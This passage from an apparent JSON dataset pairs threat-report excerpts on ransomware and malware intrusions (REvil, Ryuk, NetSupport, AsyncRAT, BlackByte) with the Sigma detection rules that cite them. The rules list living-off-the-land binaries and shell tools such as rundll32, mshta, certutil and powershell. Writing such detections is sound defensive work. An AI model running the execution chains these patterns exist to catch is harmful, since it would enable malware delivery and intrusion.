    "markdown": "# Sodinokibi (aka REvil) Ransomware **Categories:** adfind cobaltstrike icedid ransomware revil Sodinokibi **Published on:** March 29, 2021 ### Intro Sodinokibi (aka REvil) has been one of the most prolific ransomware as a service (RaaS) groups over the last couple years. The ransomware family was purported to be behind the Travelex intrusion and current reports point to an attack against Acer for a reported $50 million ransom demand. In March, we observed an intrusion which started with malicious spam that dropped IcedID (Bokbot) into the environment and subsequently allowed access to a group distributing Sodinokibi ransomware. During the intrusion the threat",
    "sigma_rule": {
      "title": "Suspicious WMIC Execution Via Office Process",
      "id": "e1693bc8-7168-4eab-8718-cdcaa68a1738",
      "related": [
        {
          "id": "438025f9-5856-4663-83f7-52f878a70a50",
          "type": "derived"
        },
        {
          "id": "518643ba-7d9c-4fa5-9f37-baed36059f6a",
          "type": "obsolete"
        },
        {
          "id": "9d1c72f5-43f0-4da5-9320-648cf2099dd0",
          "type": "obsolete"
        },
        {
          "id": "c0e1c3d5-4381-4f18-8145-2583f06a1fe5",
          "type": "obsolete"
        },
        {
          "id": "04f5363a-6bca-42ff-be70-0d28bf629ead",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Office application called wmic to proxye execution through a LOLBIN process. This is often used to break suspicious parent-child chain (Office app spawns LOLBin).",
      "references": [
        "https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/",
        "https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/02bcbfc2bfb8b4da601bb30de0344ae453aa1afe/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml"
      ],
      "author": "Vadim Khrykov, Cyb3rEng",
      "date": "2021-08-23",
      "modified": "2023-02-14",
      "tags": [
        "attack.t1204.002",
        "attack.t1047",
        "attack.t1218.010",
        "attack.execution",
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_parent": {
          "ParentImage|endswith": [
            "\\WINWORD.EXE",
            "\\EXCEL.EXE",
            "\\POWERPNT.exe",
            "\\MSPUB.exe",
            "\\VISIO.exe",
            "\\MSACCESS.EXE",
            "\\EQNEDT32.EXE",
            "\\ONENOTE.EXE",
            "\\wordpad.exe",
            "\\wordview.exe"
          ]
        },
        "selection_wmic_img": [
          {
            "Image|endswith": "\\wbem\\WMIC.exe"
          },
          {
            "OriginalFileName": "wmic.exe"
          }
        ],
        "selection_wmic_cli": {
          "CommandLine|contains|all": [
            "process",
            "create",
            "call"
          ],
          "CommandLine|contains": [
            "regsvr32",
            "rundll32",
            "msiexec",
            "mshta",
            "verclsid",
            "wscript",
            "cscript"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wmic_susp_execution_via_office_process.yml"
  },
  "679": {
    "url": "https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/02bcbfc2bfb8b4da601bb30de0344ae453aa1afe/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml",
    "markdown": "# Sodinokibi (aka REvil) Ransomware **Source Type:** Threat Intelligence Report **Vendor:** The DFIR Report **Published:** 29.03.2021 **Link:** Sodinokibi (aka REvil) Ransomware **Analyzed By:** Vadim Khrykov (@BlackMatter23) ## Threat Information ### Name - REvil ### Aliases - Sodinokibi - GOLD SOUTHFIELD - G0115 ### Attribution - Worldwide ### Tools - IceID (Bokbot) - Cobalt Strike - Bloodhound ## Analysis ### Quote - \"Initial execution of the document writes a file to... The Excel file called wmic to execute the file with regsrv32\" ### MITRE ATT&CK #### Execution - T1204.002 - User Execution - Malicious File - T1047 - Windows Management Instrumentation",
    "sigma_rule": {
      "title": "Suspicious WMIC Execution Via Office Process",
      "id": "e1693bc8-7168-4eab-8718-cdcaa68a1738",
      "related": [
        {
          "id": "438025f9-5856-4663-83f7-52f878a70a50",
          "type": "derived"
        },
        {
          "id": "518643ba-7d9c-4fa5-9f37-baed36059f6a",
          "type": "obsolete"
        },
        {
          "id": "9d1c72f5-43f0-4da5-9320-648cf2099dd0",
          "type": "obsolete"
        },
        {
          "id": "c0e1c3d5-4381-4f18-8145-2583f06a1fe5",
          "type": "obsolete"
        },
        {
          "id": "04f5363a-6bca-42ff-be70-0d28bf629ead",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Office application called wmic to proxye execution through a LOLBIN process. This is often used to break suspicious parent-child chain (Office app spawns LOLBin).",
      "references": [
        "https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/",
        "https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/02bcbfc2bfb8b4da601bb30de0344ae453aa1afe/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml"
      ],
      "author": "Vadim Khrykov, Cyb3rEng",
      "date": "2021-08-23",
      "modified": "2023-02-14",
      "tags": [
        "attack.t1204.002",
        "attack.t1047",
        "attack.t1218.010",
        "attack.execution",
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_parent": {
          "ParentImage|endswith": [
            "\\WINWORD.EXE",
            "\\EXCEL.EXE",
            "\\POWERPNT.exe",
            "\\MSPUB.exe",
            "\\VISIO.exe",
            "\\MSACCESS.EXE",
            "\\EQNEDT32.EXE",
            "\\ONENOTE.EXE",
            "\\wordpad.exe",
            "\\wordview.exe"
          ]
        },
        "selection_wmic_img": [
          {
            "Image|endswith": "\\wbem\\WMIC.exe"
          },
          {
            "OriginalFileName": "wmic.exe"
          }
        ],
        "selection_wmic_cli": {
          "CommandLine|contains|all": [
            "process",
            "create",
            "call"
          ],
          "CommandLine|contains": [
            "regsvr32",
            "rundll32",
            "msiexec",
            "mshta",
            "verclsid",
            "wscript",
            "cscript"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wmic_susp_execution_via_office_process.yml"
  },
  "680": {
    "url": "https://thedfirreport.com/2020/10/08/ryuks-return/",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious Process Created Via Wmic.EXE",
      "id": "3c89a1e8-0fba-449e-8f1b-8409d6267ec8",
      "related": [
        {
          "id": "526be59f-a573-4eea-b5f7-f0973207634d",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects WMIC executing \"process call create\" with suspicious calls to processes such as \"rundll32\", \"regsrv32\", etc.",
      "references": [
        "https://thedfirreport.com/2020/10/08/ryuks-return/",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ransomware-hive-conti-avoslocker"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2020-10-12",
      "modified": "2023-02-14",
      "tags": [
        "attack.execution",
        "attack.t1047"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|all": [
            "process ",
            "call ",
            "create "
          ],
          "CommandLine|contains": [
            "rundll32",
            "bitsadmin",
            "regsvr32",
            "cmd.exe /c ",
            "cmd.exe /k ",
            "cmd.exe /r ",
            "cmd /c ",
            "cmd /k ",
            "cmd /r ",
            "powershell",
            "pwsh",
            "certutil",
            "cscript",
            "wscript",
            "mshta",
            "\\Users\\Public\\",
            "\\Windows\\Temp\\",
            "\\AppData\\Local\\",
            "%temp%",
            "%tmp%",
            "%ProgramData%",
            "%appdata%",
            "%comspec%",
            "%localappdata%"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wmic_susp_process_creation.yml"
  },
  "681": {
    "url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ransomware-hive-conti-avoslocker",
    "markdown": "# Ransomware: How Attackers are Breaching Corporate Networks ## Latest tools, tactics, and procedures being used by the Hive, Conti, and AvosLocker ransomware operations. Targeted ransomware attacks continue to be one of the most critical cyber risks facing organizations of all sizes. The tactics used by ransomware attackers are continually evolving, but by identifying the most frequently employed tools, tactics, and procedures (TTPs) organizations can gain a deeper understanding into how ransomware groups infiltrate networks and use this knowledge to identify and prioritize areas of weakness. Symantec, a division of Broadcom Software, tracks various ransomware threats; however, the following three",
    "sigma_rule": {
      "title": "Suspicious Process Created Via Wmic.EXE",
      "id": "3c89a1e8-0fba-449e-8f1b-8409d6267ec8",
      "related": [
        {
          "id": "526be59f-a573-4eea-b5f7-f0973207634d",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects WMIC executing \"process call create\" with suspicious calls to processes such as \"rundll32\", \"regsrv32\", etc.",
      "references": [
        "https://thedfirreport.com/2020/10/08/ryuks-return/",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ransomware-hive-conti-avoslocker"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2020-10-12",
      "modified": "2023-02-14",
      "tags": [
        "attack.execution",
        "attack.t1047"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|all": [
            "process ",
            "call ",
            "create "
          ],
          "CommandLine|contains": [
            "rundll32",
            "bitsadmin",
            "regsvr32",
            "cmd.exe /c ",
            "cmd.exe /k ",
            "cmd.exe /r ",
            "cmd /c ",
            "cmd /k ",
            "cmd /r ",
            "powershell",
            "pwsh",
            "certutil",
            "cscript",
            "wscript",
            "mshta",
            "\\Users\\Public\\",
            "\\Windows\\Temp\\",
            "\\AppData\\Local\\",
            "%temp%",
            "%tmp%",
            "%ProgramData%",
            "%appdata%",
            "%comspec%",
            "%localappdata%"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wmic_susp_process_creation.yml"
  },
  "682": {
    "url": "https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/",
    "markdown": "# Sodinokibi (aka REvil) Ransomware **Categories:** adfind cobaltstrike icedid ransomware revil Sodinokibi **Published on:** March 29, 2021 ### Intro Sodinokibi (aka REvil) has been one of the most prolific ransomware as a service (RaaS) groups over the last couple years. The ransomware family was purported to be behind the Travelex intrusion and current reports point to an attack against Acer for a reported $50 million ransom demand. In March, we observed an intrusion which started with malicious spam that dropped IcedID (Bokbot) into the environment and subsequently allowed access to a group distributing Sodinokibi ransomware. During the intrusion the threat",
    "sigma_rule": {
      "title": "Suspicious WmiPrvSE Child Process",
      "id": "8a582fe2-0882-4b89-a82a-da6b2dc32937",
      "related": [
        {
          "id": "692f0bec-83ba-4d04-af7e-e884a96059b6",
          "type": "similar"
        },
        {
          "id": "d21374ff-f574-44a7-9998-4a8c8bf33d7d",
          "type": "similar"
        },
        {
          "id": "18cf6cf0-39b0-4c22-9593-e244bdc9a2d4",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects suspicious and uncommon child processes of WmiPrvSE",
      "references": [
        "https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/",
        "https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/02bcbfc2bfb8b4da601bb30de0344ae453aa1afe/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml",
        "https://blog.osarmor.com/319/onenote-attachment-delivers-asyncrat-malware/",
        "https://twitter.com/ForensicITGuy/status/1334734244120309760"
      ],
      "author": "Vadim Khrykov (ThreatIntel), Cyb3rEng, Florian Roth (Nextron Systems)",
      "date": "2021-08-23",
      "modified": "2023-11-10",
      "tags": [
        "attack.execution",
        "attack.defense-evasion",
        "attack.t1047",
        "attack.t1204.002",
        "attack.t1218.010"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_parent": {
          "ParentImage|endswith": "\\wbem\\WmiPrvSE.exe"
        },
        "selection_children_1": {
          "Image|endswith": [
            "\\certutil.exe",
            "\\cscript.exe",
            "\\mshta.exe",
            "\\msiexec.exe",
            "\\regsvr32.exe",
            "\\rundll32.exe",
            "\\verclsid.exe",
            "\\wscript.exe"
          ]
        },
        "selection_children_2": {
          "Image|endswith": "\\cmd.exe",
          "CommandLine|contains": [
            "cscript",
            "mshta",
            "powershell",
            "pwsh",
            "regsvr32",
            "rundll32",
            "wscript"
          ]
        },
        "filter_main_werfault": {
          "Image|endswith": "\\WerFault.exe"
        },
        "filter_main_wmiprvse": {
          "Image|endswith": "\\WmiPrvSE.exe"
        },
        "filter_main_msiexec": {
          "Image|endswith": "\\msiexec.exe",
          "CommandLine|contains": "/i "
        },
        "condition": "selection_parent and 1 of selection_children_* and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wmiprvse_susp_child_processes.yml"
  },
  "683": {
    "url": "https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/02bcbfc2bfb8b4da601bb30de0344ae453aa1afe/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml",
    "markdown": "# Sodinokibi (aka REvil) Ransomware **Source Type:** Threat Intelligence Report **Vendor:** The DFIR Report **Published:** 29.03.2021 **Link:** Sodinokibi (aka REvil) Ransomware **Analyzed By:** Vadim Khrykov (@BlackMatter23) ## Threat Information ### Name - REvil ### Aliases - Sodinokibi - GOLD SOUTHFIELD - G0115 ### Attribution - Worldwide ### Tools - IceID (Bokbot) - Cobalt Strike - Bloodhound ## Analysis ### Quote - \"Initial execution of the document writes a file to... The Excel file called wmic to execute the file with regsrv32\" ### MITRE ATT&CK #### Execution - T1204.002 - User Execution - Malicious File - T1047 - Windows Management Instrumentation",
    "sigma_rule": {
      "title": "Suspicious WmiPrvSE Child Process",
      "id": "8a582fe2-0882-4b89-a82a-da6b2dc32937",
      "related": [
        {
          "id": "692f0bec-83ba-4d04-af7e-e884a96059b6",
          "type": "similar"
        },
        {
          "id": "d21374ff-f574-44a7-9998-4a8c8bf33d7d",
          "type": "similar"
        },
        {
          "id": "18cf6cf0-39b0-4c22-9593-e244bdc9a2d4",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects suspicious and uncommon child processes of WmiPrvSE",
      "references": [
        "https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/",
        "https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/02bcbfc2bfb8b4da601bb30de0344ae453aa1afe/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml",
        "https://blog.osarmor.com/319/onenote-attachment-delivers-asyncrat-malware/",
        "https://twitter.com/ForensicITGuy/status/1334734244120309760"
      ],
      "author": "Vadim Khrykov (ThreatIntel), Cyb3rEng, Florian Roth (Nextron Systems)",
      "date": "2021-08-23",
      "modified": "2023-11-10",
      "tags": [
        "attack.execution",
        "attack.defense-evasion",
        "attack.t1047",
        "attack.t1204.002",
        "attack.t1218.010"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_parent": {
          "ParentImage|endswith": "\\wbem\\WmiPrvSE.exe"
        },
        "selection_children_1": {
          "Image|endswith": [
            "\\certutil.exe",
            "\\cscript.exe",
            "\\mshta.exe",
            "\\msiexec.exe",
            "\\regsvr32.exe",
            "\\rundll32.exe",
            "\\verclsid.exe",
            "\\wscript.exe"
          ]
        },
        "selection_children_2": {
          "Image|endswith": "\\cmd.exe",
          "CommandLine|contains": [
            "cscript",
            "mshta",
            "powershell",
            "pwsh",
            "regsvr32",
            "rundll32",
            "wscript"
          ]
        },
        "filter_main_werfault": {
          "Image|endswith": "\\WerFault.exe"
        },
        "filter_main_wmiprvse": {
          "Image|endswith": "\\WmiPrvSE.exe"
        },
        "filter_main_msiexec": {
          "Image|endswith": "\\msiexec.exe",
          "CommandLine|contains": "/i "
        },
        "condition": "selection_parent and 1 of selection_children_* and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wmiprvse_susp_child_processes.yml"
  },
  "684": {
    "url": "https://blog.osarmor.com/319/onenote-attachment-delivers-asyncrat-malware/",
    "markdown": "# Microsoft OneNote (.One File Extension) Attachment Delivers AsyncRAT **12 February 2024** Users reported some malicious Microsoft OneNote documents in the past days that lead to AsyncRAT, a remote administration tool used to control and monitor other computers. While it is common to see Microsoft Word, Excel and PowerPoint maldocs distributed via emails, OneNote maldocs are something new that we don’t frequently see. ```image Alt: OneNote maldicious document Description: The image depicts a Microsoft OneNote document displaying an invoice. Prominently featured in the foreground is a large blue button with the text \"Double Click To View File\". The background shows",
    "sigma_rule": {
      "title": "Suspicious WmiPrvSE Child Process",
      "id": "8a582fe2-0882-4b89-a82a-da6b2dc32937",
      "related": [
        {
          "id": "692f0bec-83ba-4d04-af7e-e884a96059b6",
          "type": "similar"
        },
        {
          "id": "d21374ff-f574-44a7-9998-4a8c8bf33d7d",
          "type": "similar"
        },
        {
          "id": "18cf6cf0-39b0-4c22-9593-e244bdc9a2d4",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects suspicious and uncommon child processes of WmiPrvSE",
      "references": [
        "https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/",
        "https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/02bcbfc2bfb8b4da601bb30de0344ae453aa1afe/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml",
        "https://blog.osarmor.com/319/onenote-attachment-delivers-asyncrat-malware/",
        "https://twitter.com/ForensicITGuy/status/1334734244120309760"
      ],
      "author": "Vadim Khrykov (ThreatIntel), Cyb3rEng, Florian Roth (Nextron Systems)",
      "date": "2021-08-23",
      "modified": "2023-11-10",
      "tags": [
        "attack.execution",
        "attack.defense-evasion",
        "attack.t1047",
        "attack.t1204.002",
        "attack.t1218.010"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_parent": {
          "ParentImage|endswith": "\\wbem\\WmiPrvSE.exe"
        },
        "selection_children_1": {
          "Image|endswith": [
            "\\certutil.exe",
            "\\cscript.exe",
            "\\mshta.exe",
            "\\msiexec.exe",
            "\\regsvr32.exe",
            "\\rundll32.exe",
            "\\verclsid.exe",
            "\\wscript.exe"
          ]
        },
        "selection_children_2": {
          "Image|endswith": "\\cmd.exe",
          "CommandLine|contains": [
            "cscript",
            "mshta",
            "powershell",
            "pwsh",
            "regsvr32",
            "rundll32",
            "wscript"
          ]
        },
        "filter_main_werfault": {
          "Image|endswith": "\\WerFault.exe"
        },
        "filter_main_wmiprvse": {
          "Image|endswith": "\\WmiPrvSE.exe"
        },
        "filter_main_msiexec": {
          "Image|endswith": "\\msiexec.exe",
          "CommandLine|contains": "/i "
        },
        "condition": "selection_parent and 1 of selection_children_* and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wmiprvse_susp_child_processes.yml"
  },
  "685": {
    "url": "https://twitter.com/ForensicITGuy/status/1334734244120309760",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious WmiPrvSE Child Process",
      "id": "8a582fe2-0882-4b89-a82a-da6b2dc32937",
      "related": [
        {
          "id": "692f0bec-83ba-4d04-af7e-e884a96059b6",
          "type": "similar"
        },
        {
          "id": "d21374ff-f574-44a7-9998-4a8c8bf33d7d",
          "type": "similar"
        },
        {
          "id": "18cf6cf0-39b0-4c22-9593-e244bdc9a2d4",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects suspicious and uncommon child processes of WmiPrvSE",
      "references": [
        "https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/",
        "https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/02bcbfc2bfb8b4da601bb30de0344ae453aa1afe/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml",
        "https://blog.osarmor.com/319/onenote-attachment-delivers-asyncrat-malware/",
        "https://twitter.com/ForensicITGuy/status/1334734244120309760"
      ],
      "author": "Vadim Khrykov (ThreatIntel), Cyb3rEng, Florian Roth (Nextron Systems)",
      "date": "2021-08-23",
      "modified": "2023-11-10",
      "tags": [
        "attack.execution",
        "attack.defense-evasion",
        "attack.t1047",
        "attack.t1204.002",
        "attack.t1218.010"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_parent": {
          "ParentImage|endswith": "\\wbem\\WmiPrvSE.exe"
        },
        "selection_children_1": {
          "Image|endswith": [
            "\\certutil.exe",
            "\\cscript.exe",
            "\\mshta.exe",
            "\\msiexec.exe",
            "\\regsvr32.exe",
            "\\rundll32.exe",
            "\\verclsid.exe",
            "\\wscript.exe"
          ]
        },
        "selection_children_2": {
          "Image|endswith": "\\cmd.exe",
          "CommandLine|contains": [
            "cscript",
            "mshta",
            "powershell",
            "pwsh",
            "regsvr32",
            "rundll32",
            "wscript"
          ]
        },
        "filter_main_werfault": {
          "Image|endswith": "\\WerFault.exe"
        },
        "filter_main_wmiprvse": {
          "Image|endswith": "\\WmiPrvSE.exe"
        },
        "filter_main_msiexec": {
          "Image|endswith": "\\msiexec.exe",
          "CommandLine|contains": "/i "
        },
        "condition": "selection_parent and 1 of selection_children_* and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wmiprvse_susp_child_processes.yml"
  },
  "686": {
    "url": "https://thedfirreport.com/2023/10/30/netsupport-intrusion-results-in-domain-compromise/",
    "markdown": "# NetSupport Intrusion Results in Domain Compromise **Category:** netsupport **Published on:** October 30, 2023 NetSupport Manager is one of the oldest third-party remote access tools still currently on the market with over 33 years of history. This is the first time we will report on a NetSupport RAT intrusion, but malicious use of this tool dates back to at least 2016. During this report, we will analyze a case from January 2023 where a NetSupport RAT was utilized to infiltrate a network. The RAT was then used for persistence and command & control, resulting in a full domain compromise. ##",
    "sigma_rule": {
      "title": "Potential Dropper Script Execution Via WScript/CScript",
      "id": "cea72823-df4d-4567-950c-0b579eaf0846",
      "related": [
        {
          "id": "1e33157c-53b1-41ad-bbcc-780b80b58288",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects wscript/cscript executions of scripts located in user directories",
      "references": [
        "https://thedfirreport.com/2023/10/30/netsupport-intrusion-results-in-domain-compromise/",
        "https://redcanary.com/blog/gootloader/"
      ],
      "author": "Margaritis Dimitrios (idea), Florian Roth (Nextron Systems), oscd.community, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2019-01-16",
      "modified": "2024-01-30",
      "tags": [
        "attack.execution",
        "attack.t1059.005",
        "attack.t1059.007"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_exec": {
          "Image|endswith": [
            "\\wscript.exe",
            "\\cscript.exe"
          ]
        },
        "selection_paths": {
          "CommandLine|contains": [
            ":\\Temp\\",
            ":\\Tmp\\",
            ":\\Users\\Public\\",
            ":\\Windows\\Temp\\",
            "\\AppData\\Local\\Temp\\"
          ]
        },
        "selection_ext": {
          "CommandLine|contains": [
            ".js",
            ".jse",
            ".vba",
            ".vbe",
            ".vbs",
            ".wsf"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Some installers might generate a similar behavior. An initial baseline is required"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wscript_cscript_dropper.yml"
  },
  "687": {
    "url": "https://redcanary.com/blog/gootloader/",
    "markdown": "",
    "sigma_rule": {
      "title": "Potential Dropper Script Execution Via WScript/CScript",
      "id": "cea72823-df4d-4567-950c-0b579eaf0846",
      "related": [
        {
          "id": "1e33157c-53b1-41ad-bbcc-780b80b58288",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects wscript/cscript executions of scripts located in user directories",
      "references": [
        "https://thedfirreport.com/2023/10/30/netsupport-intrusion-results-in-domain-compromise/",
        "https://redcanary.com/blog/gootloader/"
      ],
      "author": "Margaritis Dimitrios (idea), Florian Roth (Nextron Systems), oscd.community, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2019-01-16",
      "modified": "2024-01-30",
      "tags": [
        "attack.execution",
        "attack.t1059.005",
        "attack.t1059.007"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_exec": {
          "Image|endswith": [
            "\\wscript.exe",
            "\\cscript.exe"
          ]
        },
        "selection_paths": {
          "CommandLine|contains": [
            ":\\Temp\\",
            ":\\Tmp\\",
            ":\\Users\\Public\\",
            ":\\Windows\\Temp\\",
            "\\AppData\\Local\\Temp\\"
          ]
        },
        "selection_ext": {
          "CommandLine|contains": [
            ".js",
            ".jse",
            ".vba",
            ".vbe",
            ".vbs",
            ".wsf"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Some installers might generate a similar behavior. An initial baseline is required"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wscript_cscript_dropper.yml"
  },
  "688": {
    "url": "https://redcanary.com/blog/blackbyte-ransomware/",
    "markdown": "## ProxyShell exploitation leads to BlackByte ransomware The BlackByte ransomware operators leverage ProxyShell Microsoft Exchange vulnerabilities for initial access along with Cobalt Strike for lateral movement. Here’s what to look out for. **Originally published:** November 30, 2021 **Last modified:** April 30, 2024 --- As law enforcement arrests continue to put a dent in the plague of ransomware, new variants continue to pop up week after week. BlackByte ransomware was first publicly identified in a July 2021 BleepingComputer forum post from a user seeking help decrypting their encrypted files. Since then, there’s been a slow trickle of information regarding this new",
    "sigma_rule": {
      "title": "Suspicious Windows Update Agent Empty Cmdline",
      "id": "52d097e2-063e-4c9c-8fbb-855c8948d135",
      "status": "test",
      "description": "Detects suspicious Windows Update Agent activity in which a wuauclt.exe process command line doesn't contain any command line flags\n",
      "references": [
        "https://redcanary.com/blog/blackbyte-ransomware/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-02-26",
      "modified": "2023-11-11",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\Wuauclt.exe"
          },
          {
            "OriginalFileName": "Wuauclt.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|endswith": [
            "Wuauclt",
            "Wuauclt.exe"
          ]
        },
        "condition": "all of selection*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wuauclt_no_cli_flags_execution.yml"
  },
  "689": {
    "url": "https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html",
    "markdown": "# SANNY Malware Delivery Method Updated in Recently Observed Attacks **March 23, 2018** ### Introduction In the third week of March 2018, through FireEye’s Dynamic Threat Intelligence, FireEye discovered malicious macro-based Microsoft Word documents distributing SANNY malware to multiple governments worldwide. Each malicious document lure was crafted in regard to relevant regional geopolitical issues. FireEye has tracked the SANNY malware family since 2012 and believes that it is unique to a group focused on Korean Peninsula issues. This group has consistently targeted diplomatic entities worldwide, primarily using lure documents written in English and Russian. As part of these recently observed",
    "sigma_rule": {
      "title": "Cab File Extraction Via Wusa.EXE From Potentially Suspicious Paths",
      "id": "c74c0390-3e20-41fd-a69a-128f0275a5ea",
      "related": [
        {
          "id": "59b39960-5f9d-4a49-9cef-1e4d2c1d0cb9",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects the execution of the \"wusa.exe\" (Windows Update Standalone Installer) utility to extract \".cab\" files using the \"/extract\" argument from potentially suspicious paths.\n",
      "references": [
        "https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html",
        "https://www.echotrail.io/insights/search/wusa.exe/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-05",
      "modified": "2023-11-28",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_root": {
          "Image|endswith": "\\wusa.exe",
          "CommandLine|contains": "/extract:"
        },
        "selection_paths": {
          "CommandLine|contains": [
            ":\\PerfLogs\\",
            ":\\Users\\Public\\",
            ":\\Windows\\Temp\\",
            "\\Appdata\\Local\\Temp\\"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wusa_cab_files_extraction_from_susp_paths.yml"
  },
  "690": {
    "url": "https://www.echotrail.io/insights/search/wusa.exe/",
    "markdown": "",
    "sigma_rule": {
      "title": "Cab File Extraction Via Wusa.EXE From Potentially Suspicious Paths",
